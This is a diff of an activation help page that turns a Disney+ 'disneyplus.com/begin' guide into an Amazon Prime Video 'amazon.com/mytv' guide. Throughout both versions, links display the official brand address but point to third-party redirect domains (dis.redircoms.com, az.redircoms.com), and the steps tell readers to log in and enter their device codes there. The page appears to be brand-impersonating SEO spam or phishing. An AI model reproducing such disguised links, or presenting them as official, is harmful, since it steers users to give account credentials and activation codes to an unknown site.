@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Use Amazon.com/mytv to Activate Your Device (Step-by-Step Guide)
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: FE216E19E94441856C00D18618ACAE7D
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,45 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: amazon.com/mytv
+   :target: https://az.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Want to enjoy Prime Video on your Smart TV or streaming device? You can activate your device quickly by heading to  
+`amazon.com/mytv <https://az.redircoms.com>`_ and entering the code displayed on your screen. Follow the instructions below to get started.
 
 **********
-Steps to Activate Disney+ on Your Device
+How to Activate Prime Video at amazon.com/mytv
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the **Prime Video app** on your streaming device or Smart TV.
+2. Note the **activation code** that appears on the screen.
+3. Open a web browser on your mobile or desktop device and go to  
+   `amazon.com/mytv <https://az.redircoms.com>`_.
+4. Log into your **Amazon account** when prompted.
+5. Enter the on-screen code and click **Register Device**.
+6. Your screen will refresh, and Prime Video will now be active and ready to use.
 
 **********
-What to Do After Activation
+Requirements Before You Begin
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- A valid Amazon account with an active Prime Video subscription  
+- A compatible streaming device or Smart TV  
+- Reliable internet access  
+- The unique activation code displayed on your TV screen  
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Tips for a Smooth Activation
+**********
+
+- Activation codes typically expire—relaunch the app if yours does.  
+- Make sure to log in using the Amazon account linked to your Prime membership.  
+- If the site doesn’t load properly, switch to a different browser or clear your cache.
+
+Get started with unlimited streaming of Amazon Originals and popular titles by visiting  
+`amazon.com/mytv <https://az.redircoms.com>`_ and completing the activation process.
